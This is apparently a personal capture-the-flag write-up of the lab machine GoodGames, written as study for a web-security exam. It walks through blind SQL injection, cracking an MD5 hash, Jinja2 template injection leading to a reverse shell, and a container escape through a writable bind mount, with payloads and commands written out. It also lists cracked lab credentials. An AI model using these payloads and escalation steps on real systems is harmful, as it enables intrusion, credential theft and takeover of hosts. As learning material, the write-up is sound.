# GoodGames — 10.129.96.71

Status: ✅ **ROOTED** — user.txt + root.txt captured.
Started: 2026-08-27

CWES rep: this is #1 in `Exams/CWES/Practice list`. Queued classes on it there: **SQLi**, **SSTI**.
Whitebox-first still applies — if source shows up (backup, `.git`, error trace, template on disk),
stop guessing and read it.

---

## Kill chain
- [x] P1 Recon (nmap full + services)
- [x] P3 Web enum (app surface mapped from Burp; vhost found post-auth, not by fuzzing)
- [x] P4 Web exploit — SQLi (store) + SSTI (admin panel)
- [x] P5 Foothold — RCE via SSTI, reverse shell to 9001
- [ ] P5 Foothold + stabilize
- [x] P6 Local recon — container enumerated, app source read
- [x] P6b Container escape — rw bind mount of host `/home/augustus`
- [x] P7 Privesc → root (SUID bash)

---

## 1. Infrastructure

Target: `10.129.96.71`
Hostname(s):
- `goodgames.htb`
- `internal-administration.goodgames.htb` — **found post-auth**, linked from the admin session
  (`/login` on that vhost). Not brute-forceable, see §6.

**Full TCP sweep: exactly one port open.** 65534 closed (RST), so no filtering — this is a
web-only box. No SSH, so a foothold has to come out of the app itself.

| port | service | version | notes |
|---|---|---|---|
| 80/tcp | http | Werkzeug httpd 2.0.2 (Python 3.9.2) | `Server: Werkzeug/2.0.2 Python/3.9.2` · title `GoodGames \| Community and Store` |

### Stack read
- Werkzeug is the WSGI layer under **Flask** → Python web app, **Jinja2** templating by default.
- **There is an Apache reverse proxy in front of the Flask app.** Two independent tells:
  - Every captured response carries `Keep-Alive: timeout=5, max=N` with N counting down
    100→93… — that is Apache's `MaxKeepAliveRequests` counter. Werkzeug's dev server emits
    no `Keep-Alive` header at all; nginx doesn't use the `max=` form either.
  - `/server-status` → **403** (Apache `mod_status`, typically `Require local`). A Flask app
    with no such route would return Werkzeug's 404 page, not a 403 — so Apache is handling
    that path itself, before proxying.
  - `Server: Werkzeug/2.0.2` is therefore the **backend's** header passed through by
    `mod_proxy`. The banner describes what's behind the proxy, not what we're talking to.
- Static files carry `Content-Disposition: inline; filename=...` → served by Flask's own
  static handler (send_file), i.e. Apache is proxying `/` wholesale rather than serving static.
- Version-CVE question: Werkzeug 2.0.2 (Oct 2021) — nothing RCE-grade by itself; the
  interesting surface is the app, not the server.
- No nmap script findings beyond the title/server header.

## 2. Enumeration

Source: Burp export `loot/HTTP Requests` (1530 items, Burp 2026.4.3).
Parser written: `exploits/burp_parse.py` (`--inventory` / `--grep` / `--dump`).
Burp base64-encodes some bodies, so raw grep on the XML misses things — decode first.

### Dynamic endpoints (everything else is /static/)

| method | path | status | notes |
|---|---|---|---|
| GET/POST | `/signup` | 200 | fields: `name`, `email`, `password`, `password2` |
| POST | `/login` | 200 | fields: `email`, `password` — login is by **email**, not name |
| GET | `/logout` | 302 | |
| GET | `/profile` | 200 | authed; heading renders `<h4>test's profile</h4>` |
| POST | `/password-reset` | 200 | fields: `email`, `password`, `password2` |
| GET/POST | `/forgot-password` | 200 | JSON API (`X-Requested-With: XMLHttpRequest`), field `Email` (capital E) |
| GET | `/blog` | 200 | static-looking post list |
| GET | `/coming-soon` | 200 | |
| GET | `/` | 200 | |
| GET | `/server-status` | **403** | Apache `mod_status` — proves a proxy in front (see §1) |

Everything except `/server-status` came from following links; nothing else has been probed
off-path yet.

### Usernames scraped

| name | source | assessment |
|---|---|---|
| `test` / `test@test.com` | `/profile` heading + own signup | **real** — our own registered account |
| `Wolfenstein` | blog + homepage bylines (x11) | ⚠️ likely template filler |
| `Witch Murder` | blog bylines (x3) | ⚠️ likely template filler |
| `Hitman` | blog bylines (x2) | ⚠️ likely template filler |

The three bylines sit in `class="nk-post-by"` markup — the `nk-` prefix is the purchased
HTML theme's namespace, and the surrounding post text is Lewis Carroll filler ("...she thought;
`and how fun"). Game-title names + lorem body = **theme boilerplate, not database rows.** Treat
them as low-confidence until something server-side confirms one exists.

**Next per methodology P3:** vhost fuzz (Flask + Host-header routing is a common HTB pattern),
content brute, then read the app's own forms/params.

## 3. Web attack surface

Every input found → which classes swept against it (P4 list in `../../METHODOLOGY.md`).

| input | location | classes tried | result |
|---|---|---|---|
| `email` | POST `/login` | SQLi | ✅ **time-based blind, MySQL >= 5.0.12** |
| `password` | POST `/login` | — | not yet |
| `name`/`email`/`password` | POST `/signup` | — | not yet |
| `email` | POST `/forgot-password` | — | not yet |
| `email`/`password` | POST `/password-reset` | — | not yet |
| `username`/`password` | POST `/login` (internal-administration) | user-enum | ✅ **enumerable** — see below |
| `name` | POST `/settings` (internal-administration) | XSS, SSTI | ✅ **XSS + SSTI** (Jinja2) |

### internal-administration.goodgames.htb — user enumeration

Controlled test (only the username value changed, so field names are confirmed correct):

```
username=zzzznotauser&password=zzzz  ->  13615 bytes   (login page re-rendered)
username=admin&password=zzzz         ->    218 bytes   (redirect-sized body)
```

Unlike `/forgot-password` on the main site, this panel **leaks account existence**. `admin`
exists here.

✅ **Logged in: `admin` : `superadministrator`** (password reuse — the earlier "no reuse" was
the email form; bare username works).

**Login mechanics — needed to script it:** requires `csrf_token` (hidden field, Flask-WTF)
**and** the submit field `login=`. Without `login=` the server returns a **302 that looks like
success** but the session stays unauthenticated. Only the cookie tells the truth:

```
failed : {"_fresh":false,"csrf_token":"..."}
ok     : {"_fresh":true,"_user_id":"1","_id":"...","csrf_token":"..."}   (zlib, leading '.')
```

### ⚠️ Two separate backends behind the Apache proxy

```
goodgames.htb                          Werkzeug/2.0.2  Python/3.9.2
internal-administration.goodgames.htb  Werkzeug/2.0.2  Python/3.6.7
```

Same Werkzeug, **different Python minor version** — one runtime cannot serve both. Confirms
§1's proxy finding and says the two apps run on separate hosts/containers.

### Authenticated surface (Volt Free / Themesberg Bootstrap 5 dashboard)

| path | status | note |
|---|---|---|
| `/index`, `/dashboard` | 200 | identical, 73612 B |
| `/transactions` | 200 | 52183 B |
| `/settings` | 200 | **the only POST form** |
| `/` | 302 → `/login` | |
| `/profile` | 404 | |

**The entire authenticated input surface is one parameter: `name` on POST `/settings`.**
The page shows `birthday`, `email`, `phone` too, but those carry only `id=` and no `name=`,
so the browser never submits them. `email` is `readonly`, hard-coded `admin@goodgames.htb`.

### `name` IS reflected (server-side)

`POST /settings` with `name=Test` (saved: `loot/Name_Update`) → 200, value rendered into the
profile card at offset ~25900:

```html
<h4 class="h3">
    Test
</h4>
<h5 class="fw-normal">
    admin
</h5>
```

Server-rendered, not JS-inserted. Appears to persist → likely **stored**, so it re-renders on
every load (confirm with a plain `GET /settings`).

**Fingerprint ladder — do not assume SSTI just because it's expected:**

| payload | result | means |
|---|---|---|
| `{{7*7}}` | `49` | template source is evaluated → **SSTI** |
| `{{7*7}}` | literal `{{7*7}}` | no evaluation → output reflection only, test XSS |
| `{{7*'7'}}` | `7777777` | **Jinja2** (Python string repetition) |
| `{{7*'7'}}` | `49` | Twig, not Jinja2 |
| `<b>xx</b>` | renders bold | output unescaped (Jinja2 autoescapes by default) |

Also check whether the stored name renders on `/index` / `/transactions` — a stored value often
appears in nav/header across pages, possibly with different escaping.

✅ **XSS confirmed** — `name` output is **unescaped**.

Jinja2 autoescapes by default, so unescaped output has only three causes:
1. template applies `|safe`
2. inside `{% autoescape false %}`
3. **the value is concatenated into the template source** <- this one is SSTI

`{{7*7}}` distinguishes #3 from #1/#2 in one request.

✅ **SSTI CONFIRMED on `name`.** Cause #3 — the value is concatenated into template source.
The XSS was not a separate bug, it was a *symptom* of the same root cause: unescaped output
and template evaluation both follow from user input being treated as template, not data.
This is why the autoescape anomaly was worth stopping on rather than filing as "just XSS".

✅ **Engine confirmed Jinja2** — `{{7*'7'}}` → `7777777` (Python string repetition; Twig
would return `49`). Predicted from the Werkzeug banner in §1, then confirmed dynamically.

```html
<h4 class="h3">
    7777777
</h4>
<h5 class="fw-normal">admin</h5>
<p class="text-gray mb-4">admin@goodgames.htb</p>
```

**Prioritization note:** stored XSS only pays when it fires in *someone else's* browser. We are
already the sole admin and the payload lands in our own profile card — no one to escalate to
unless a second user or an automated reviewer turns up. Record it as a CWES rep; don't chase it.

### SQLi — `/login`, `email` (POST)

Found by sqlmap in 86 requests. Output dir: `~/.local/share/sqlmap/output/goodgames.htb/`
(`log`, `session.sqlite`, `target.txt` — log is append-only across runs).

```
Type:    time-based blind
Title:   MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: email=test@test.com' AND (SELECT 1455 FROM (SELECT(!SLEEP(5)))VzPj) AND 'Lgqd'='Lgqd
DBMS:    MySQL >= 5.0.12
DBs:     information_schema, main
main:    user, blog, blog_comments        <- treat as a FLOOR, see caveat
```

**Why only time-based?** Boolean-based needs a detectable true/false response difference —
`/login` likely renders identically for both, so sqlmap can't calibrate an oracle. Error-based
needs SQL errors in the response; Flask in non-debug mode swallows them. So it fell back to
timing, which is the slowest technique available.

**Speed:** sqlmap forces single-thread for time-based (concurrency wrecks timing). ~7 requests
per char x sleep = ~35 s/char at the default `SLEEP(5)`. Latency to box is 47 ms, so
`--time-sec=2` is safe and cuts ~60%. Narrow before dumping: `-D main -T user --columns`.

**Caveat (MonitorsThree lesson):** sqlmap silently truncates enumeration when a read is
dropped — no error raised. Time-based is *more* prone to this, since a lost read just reads
as "false". `[3 tables]` is a floor, not a confirmed-complete list.

## 4. Loot

| what | where from | value | file |
|---|---|---|---|
| `main.user` table (2 rows) | time-based blind SQLi on POST `/login` `email` | admin + test accounts | `loot/user_table.csv` |
| admin MD5 hash | same | `2b22337f218b2d82dfc3b6f77e7cb8ec` | `loot/admin_md5.hash` (`-m 0`) |
| 🔑 **admin creds** | cracked (rockyou, no rules) | `admin@goodgames.htb` : `superadministrator` | verified: md5 matches |
| sqlmap request file | Burp → saved request | — | `loot/login_sqli` |

```
id,email,name,password
1,admin@goodgames.htb,admin,2b22337f218b2d82dfc3b6f77e7cb8ec
2,test@test.com,test,5f4dcc3b5aa765d61d8327deb882cf99  (= "password")
```

**Format confirmed as raw unsalted MD5** — sqlmap's built-in dict resolved our own test row to
`password`, and `md5("password") == 5f4dcc3b...`. That's a free known-plaintext validation of
the column format, so a cracking *negative* on the admin hash is trustworthy. sqlmap's small
dict did NOT crack admin's, so it's not in that list → rockyou + rules on the Windows host:

```
D:\hashcat-7.1.2\hashcat.exe -m 0 -a 0 admin_md5.hash D:\hashcat-7.1.2\rockyou.txt
D:\hashcat-7.1.2\hashcat.exe -m 0 -a 0 admin_md5.hash D:\hashcat-7.1.2\rockyou.txt -r D:\hashcat-7.1.2\rules\best66.rule
```

✅ **Cracked: `superadministrator`** — straight rockyou, no rules needed. 18 chars, so length
was never the barrier; wordlist position beats entropy (same lesson as `estrella` on Instant).

## 5. Privesc

### Foothold

Jinja2 SSTI on `name` (POST `/settings`) → `lipsum.__globals__['os'].popen(...)` →
reverse shell to 10.10.15.212:9001. Payloads: `exploits/ssti_revshell.txt`.

```
root@3a453ab39d3d:/home/augustus# id
uid=0(root) gid=0(root) groups=0(root)
```

**We are root inside a Docker container, NOT on the host.**
- Hostname `3a453ab39d3d` = 12-hex Docker container ID.
- Root's home is empty — no `root.txt` here. The root flag is on the host.
- Confirms the §1 two-backend finding: `Python/3.6.7` here vs `Python/3.9.2` on the store
  front. A passive banner detail predicted the architecture before we had any access.

**Anomaly to chase:** the shell landed in `/home/augustus`. Stock containers don't carry human
home directories — they run as root with an unpopulated `/home`. A real username on a real
home path *inside* a container needs explaining. Where is that directory coming from?

user.txt: captured (in `/home/augustus`).

### Escape → host root

The bind mount is writable and we are root on the container side, so **host state** can be
modified from in here — both ownership/mode bits and file contents.

**Step 1 — get onto the host as augustus.** Host `172.19.0.1` (bridge gateway; container is
`172.19.0.2/16` — a *user-defined* network, not the default `172.17`). SSH is open there but
was **closed on the external interface**, which is why the original nmap saw only :80.

Two routes, both work:
- 🥇 **Password reuse** — augustus's password was one we already held. One request.
- 🔧 **Planted SSH key** — `mkdir /home/augustus/.ssh`, write our pubkey to `authorized_keys`,
  then `chown` to augustus's numeric uid (read it off `ls -na /home/augustus`; the container's
  `/etc/passwd` is the *container's*), `chmod 700`/`600`. sshd's `StrictModes` silently ignores
  the file otherwise. Six steps vs one — but it needs no reusable password to exist.

⚠️ SSH password auth fails from a raw reverse shell (no TTY) in a way that looks like a bad
credential. Upgrade first: `python -c 'import pty;pty.spawn("/bin/bash")'` (container has
`python`, not `python3`).

**Step 2 — plant the SUID binary.**
```
# on the HOST as augustus  (host's own bash — container's is built against a different libc)
cp /bin/bash /home/augustus/bash

# in the CONTAINER as root  (only place chown root is permitted)
chown root:root /home/augustus/bash
chmod 4755 /home/augustus/bash

# on the HOST as augustus
/home/augustus/bash -p        # -p is MANDATORY
id                            # euid=0(root)
```

⚠️ **`-p` or it silently fails.** Bash drops its effective uid when euid != uid unless `-p` is
given — a deliberate defusing of exactly this trick. Without it the shell looks fine and `id`
shows plain augustus.

root.txt: captured. ✅

### App source (whitebox) — `/backend/project/`

`run.py` → this is **AppSeed's Flask Volt Dashboard** boilerplate (matches the Themesberg Volt
theme in the HTML). Upstream is public, so the deployment can be diffed against it — anything
that differs is config or custom code.

- `app.run(host="0.0.0.0", port="8085")` → app listens on **8085** inside the container.
  Completes the architecture: host Apache :80 → Host-header routing → proxy to container:8085.
  Explains why nmap only ever saw port 80.
- ~~`DEBUG` defaults ON, Werkzeug debugger likely reachable~~ — **WRONG, corrected after
  reading `config.py`.** `DEBUG=True` in `.env` only selects the *Debug config mode*; then
  `class DebugConfig(Config): DEBUG = False` flips it back off. Flask debug is **off**. The
  naming is actively misleading — which is the argument for reading source over inferring
  from variable names.
- `from decouple import config` → secrets live in a **`.env`** in the project root, which is
  why `run.py` has none.

#### `.env` + `config.py` — read together, they contradict each other

```
DEBUG=True          SECRET_KEY=S3cr3t_K#Key
DB_ENGINE=postgresql  DB_NAME=appseed-flask  DB_HOST=localhost
DB_PORT=5432          DB_USERNAME=appseed    DB_PASS=pass
```

**The Postgres creds are dead configuration.** `SQLALCHEMY_DATABASE_URI` is built from the
`DB_*` values *only* in `ProductionConfig`. The app runs `DebugConfig`, which doesn't override
it, so it inherits the base `Config` value:

```python
SQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(basedir, 'db.sqlite3')
```

→ real DB is **SQLite** at `/backend/project/apps/db.sqlite3`. Chasing `appseed:pass` on
:5432 would have been wasted effort, and nothing but `config.py` reveals that. Two files that
look complementary; one silently overrides the other.

**Worth keeping:**
| value | why |
|---|---|
| `S3cr3t_K#Key` | Flask **SECRET_KEY** — forge any session on this app. Low value while we're admin; matters if another account exists. |
| `pass`, `appseed`, `S3cr3t_K#Key` | spray candidates — we have a host username (`augustus`) and no password yet, and this box already reused one credential across two apps |

Still to read: `/backend/project/apps/authentication/` (models.py, routes.py).

⚠️ Source reading is a **credential-mining branch, not the escape**. The escape is the bind
mount below; it needs nothing from this source tree.

### P6b — container enumeration: the seam is a bind mount

`mount` output. One line is not standard:

```
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```

**`/home/augustus` is bind-mounted from `/dev/sda1` — the HOST's real disk — read-write**, and
we are root on this side of it. Everything else is overlay2 / tmpfs / proc / sysfs / cgroup.

Contrast with the three lines below it, which *are* normal — Docker always bind-mounts these
to manage container network identity:
```
/dev/sda1 on /etc/resolv.conf
/dev/sda1 on /etc/hostname
/dev/sda1 on /etc/hosts
```
Seeing `/dev/sda1` isn't the finding. Seeing it on a path that isn't one of Docker's standard
three is.

**Everything else is hardened — which is what makes the mount load-bearing:**

| check | state | consequence |
|---|---|---|
| `/sys/fs/cgroup/*` | **ro** | `release_agent` escape blocked |
| `/proc/sys` | **ro** | `core_pattern` escape blocked |
| `/sys` | **ro** | |
| `/var/run/docker.sock` | absent | no daemon takeover |
| `/proc/kcore`, `keys`, `sched_debug`, `timer_list` | tmpfs-masked | standard Docker hardening, not `--privileged` |

All generic P6b vectors are closed. The operator *gave* this container a writable window into
the host, and that window is the whole escape surface. Two properties that matter: it is
**rw**, and we are **root** on this side — so ownership and permissions on the host side of
that path are ours to set.

## 6. Dead ends

_(record these — they're worth as much as the hits)_

- **`/forgot-password` is not a user-enumeration oracle.** Returns the same generic JSON
  (`"If the email you supplied is valid you will an email with further instructions..."`)
  regardless of whether the address exists. Correctly implemented — don't waste time
  diffing responses here.
- Blog/homepage bylines (Wolfenstein, Witch Murder, Hitman) are theme filler, not users.
- **"No password reuse" on internal-administration was a FALSE negative** — only the *email*
  form (`admin@goodgames.htb`) was tried, never the bare username `admin`. Same shape as the
  Instant SSH result: the negative was real but answered a narrower question than intended.
  → Always spray every identifier FORM, not just every credential: `admin`,
  `admin@goodgames.htb`, `administrator`, domain-qualified variants.
- **vhost fuzz — 0 results, but treat as UNVALIDATED.**
  `ffuf -u http://10.129.96.71 -w .../subdomains-top1million-5000.txt -H "Host: FUZZ.goodgames.htb" -fs 85107`
  → 0 hits (`scans/vhost_scan.ffuf`). Caveats before calling this a real negative:
  - `-fs 85107` is a hand-picked single size; the homepage was seen at two distinct sizes in
    Burp (~85327 and ~85715 incl. headers, logged-out vs logged-in). Re-run with `-ac`.
  - Never tested bare `goodgames.htb` — `FUZZ.goodgames.htb` only covers third-level names.
  - If `goodgames.htb` is Apache's **default** vhost, every unknown Host falls through to it
    and content-diff fuzzing cannot produce a hit at all.

  **RESOLVED — the negative was a wordlist limitation, not a technique failure.**
  `internal-administration.goodgames.htb` exists and is reachable, but appears in **none** of:

  | wordlist | lines | exact match |
  |---|---|---|
  | subdomains-top1million-5000 | 4,989 | 0 |
  | subdomains-top1million-20000 | 19,966 | 0 |
  | subdomains-top1million-110000 | 114,442 | 0 |
  | bitquark-subdomains-top100000 | 100,000 | 0 |
  | dns-Jhaddix | 2,171,687 | 0 |

  No escalation would have found it. Hyphenated compound names sit outside subdomain lists,
  which are built from observed public DNS. Host routing *was* live (Apache, as derived in §1)
  — the technique was sound, the dictionary just didn't contain the word.

  **Lesson: brute force only finds what's in the list.** This vhost came from *authenticating
  and reading the app* — post-auth content is a discovery surface no wordlist reaches. Good
  thing this was logged as "unvalidated" rather than "no vhosts exist"; a confidently-wrong
  negative would have blocked this line of thought entirely.

## 7. Lessons

1. **A passive banner predicted the architecture.** `Keep-Alive: timeout=5, max=N` counting
   down = Apache's `MaxKeepAliveRequests`; Werkzeug emits no such header. That plus a 403 on
   `/server-status` proved an Apache reverse proxy before we had any access — and `Python/3.9.2`
   vs `Python/3.6.7` across the two vhosts proved two backends. All from response headers.
2. **A 0-result brute force is not a negative.** `internal-administration` is in no subdomain
   wordlist, not even Jhaddix's 2.1M. Brute force only finds what's already in the list; the
   vhost came from authenticating and reading the app. Logging it as "unvalidated" instead of
   "no vhosts exist" kept the door open.
3. **"No password reuse" was a false negative** — only the email form was tried, never the bare
   username. Spray every identifier FORM, not just every credential.
4. **XSS in an autoescaping engine is a tell, not a finding.** Jinja2 autoescapes by default,
   so unescaped output meant `|safe`, `autoescape false`, or input concatenated into template
   source. The third is SSTI — and it was. The XSS was a symptom, not a separate bug.
5. **Read config files together, not separately.** `.env` advertises Postgres creds that
   `config.py` never uses (`DebugConfig` inherits the base sqlite URI). Acting on `.env` alone
   would have sent us to a dead database. Same file pair also inverted the DEBUG flag.
6. **Root in a container is a different problem from privesc.** Not "get more privilege" —
   "get a different namespace". Everything generic was hardened (cgroups ro, /proc/sys ro, no
   docker.sock); the escape was a misconfiguration the operator *chose*: a rw bind mount.
7. **A rw bind mount carries metadata, not just data.** Ownership and mode bits cross the
   boundary too. `authorized_keys` and the SUID bit are both just *host state that grants
   privilege* — same primitive, two flavours.
8. **Spray first, engineer second.** augustus's password turned out to be one we already had.
   The planted SSH key worked but cost six steps and a `StrictModes` trap; the password was one
   request. Cheapest test that could resolve the question goes first. (Keep the key technique
   though — it works when no reusable password exists.)
9. **`bash -p` or it silently fails.** Bash drops its effective uid when euid != uid unless
   `-p` is passed. Without it a SUID bash looks like it worked and `id` shows the plain user.
10. **SSH needs a real TTY.** Password auth from a raw reverse shell fails in a way that looks
    like a rejected credential. `python -c 'import pty;pty.spawn("/bin/bash")'` first.

## 8b. Full kill chain

```
nmap -p-                      -> only :80, Werkzeug/2.0.2 Python/3.9.2
response headers              -> Keep-Alive max=N + /server-status 403 => Apache proxy in front
Burp export                   -> 9 dynamic endpoints; only real user is our own
sqlmap POST /login `email`    -> time-based blind SQLi (MySQL)
  -D main -T user --dump      -> admin 2b22337f... / test 5f4dcc3b... (= "password")
                                 test row = free known-plaintext proof the column is raw MD5
hashcat -m 0 + rockyou        -> admin : superadministrator
login to goodgames.htb        -> reveals vhost internal-administration.goodgames.htb
                                 (in NO subdomain wordlist - only findable post-auth)
login there as admin          -> bare username, NOT the email (first attempt was a false negative)
                                 needs csrf_token + submit field `login=`
POST /settings `name`         -> unescaped output in an autoescaping engine => suspicious
{{7*7}} -> 49                 -> SSTI confirmed
{{7*'7'}} -> 7777777          -> engine is Jinja2
lipsum.__globals__['os'].popen -> reverse shell 9001
                              => root@3a453ab39d3d  (Docker container, NOT the host)
mount                         -> /dev/sda1 on /home/augustus (rw) = host disk bind-mounted
                                 everything else hardened: cgroups ro, /proc/sys ro, no docker.sock
ip -4 addr / ip route         -> container 172.19.0.2, host = 172.19.0.1
/dev/tcp sweep on gateway     -> :22 open internally (closed externally)
ssh augustus@172.19.0.1       -> password reuse (also: plantable via authorized_keys)
cp /bin/bash ~ ; chown+chmod  -> SUID root binary written through the mount to the HOST
./bash -p                     -> euid=0 on the host => root.txt
```

## 7b. CWES relevance

Both classes this box was queued for, hit whitebox-first:

- **SQLi** (time-based blind, MySQL) — and the *tooling* lessons matter more than the finding:
  why only time-based was available (no boolean oracle, no surfaced errors), why that forces
  single-threaded retrieval, and `--time-sec` tuning against measured latency.
- **SSTI** (Jinja2) — engine predicted from the `Server` banner, then confirmed dynamically
  with `{{7*'7'}}` before any exploit payload. That's the habit the queue exists to build.
- Bonus reps: **stored XSS**, **user enumeration** (present on one login, correctly absent on
  the other — a good contrast pair), **container escape**, **source-code review of a known
  OSS boilerplate** (AppSeed Flask Volt Dashboard — upstream is public and diffable).

## 8. Command log

_(append live, one line per real step)_

1. `nmap -p- --min-rate 5000 -oA scans/allports 10.129.96.71` → only 80/tcp open, 65534 closed
2. `nmap -sCV -p80 -oA scans/services 10.129.96.71` → Werkzeug 2.0.2 / Python 3.9.2, title "GoodGames | Community and Store"
3. Browsed site in Burp, exported → `loot/HTTP Requests` (XML, 1530 items) + `scans/2026-08-27.burp`
4. `python3 exploits/burp_parse.py "loot/HTTP Requests" --inventory` → 9 dynamic endpoints, rest static
5. Scraped names from decoded responses → only `test` (own account) is confirmed real
6. `ffuf ... -H "Host: FUZZ.goodgames.htb" -fs 85107` → 0 results (unvalidated, see §6)
7. `/server-status` → 403 ⇒ Apache proxy in front of Flask (corrects earlier "Flask ignores Host" read)
8. `sqlmap -r login_sqli -batch` → time-based blind on `email` (POST /login), MySQL >= 5.0.12
9. `sqlmap -r login_sqli -batch -D main --tables` → main: user, blog, blog_comments
10. `sqlmap ... --time-sec=2 -D main -T user --dump` → 2 rows; admin MD5 `2b22337f...`, test = `password`
11. `hashcat -m 0 admin_md5.hash rockyou.txt` (Windows host) → `superadministrator` (verified locally)
12. Logged into goodgames.htb as admin → new vhost surfaced: `internal-administration.goodgames.htb/login`
13. Confirmed that name is absent from all 5 major seclists subdomain wordlists (incl. Jhaddix 2.1M)
14. `admin`/`superadministrator` + csrf_token + `login=` → authenticated (`_user_id:1`)
15. Enumerated authed surface → only submitted param in whole app is `name` (POST /settings)
16. `POST /settings name=Test` → reflected server-side in profile card `<h4 class="h3">` (`loot/Name_Update`)
17. `name` confirmed XSS-able → output unescaped (notable: Jinja2 autoescapes by default)
18. `{{7*7}}` → evaluated ⇒ **SSTI confirmed** on `name` (XSS was a symptom of the same root cause)
19. `{{7*'7'}}` → `7777777` ⇒ engine confirmed **Jinja2**
20. `{{ lipsum.__globals__['os'].popen("bash -c '...b64 revshell...'").read() }}` → shell on 9001
21. `id` → uid=0 root, hostname `3a453ab39d3d` ⇒ **inside a Docker container**, not the host
22. `mount` → `/dev/sda1 on /home/augustus (rw)` = host-disk bind mount; all other escape vectors closed
23. `cat /backend/project/run.py` → AppSeed Flask Volt Dashboard, listens :8085, secrets via decouple/.env
24. `cat .env` + `cat apps/config.py` → SECRET_KEY `S3cr3t_K#Key`; postgres creds UNUSED (DebugConfig → sqlite); Flask debug actually OFF
25. `ip -4 addr show` → container `172.19.0.2/16` ⇒ host is `172.19.0.1` (user-defined bridge, not 172.17)
26. `/dev/tcp` sweep on `172.19.0.1` → :22 open internally (was closed on the external face)
27. `python -c 'import pty;pty.spawn("/bin/bash")'` → TTY (needed for SSH password auth)
28. `ssh augustus@172.19.0.1` → in (password reuse; SSH key also planted via the mount)
29. host: `cp /bin/bash /home/augustus/bash` · container: `chown root:root` + `chmod 4755`
30. host: `/home/augustus/bash -p` → `euid=0` ⇒ **root.txt** ✅

## 9. Files
```
scans/     nmap + dirbrute output
loot/      captured creds/keys/files
exploits/  scripts + payloads
```
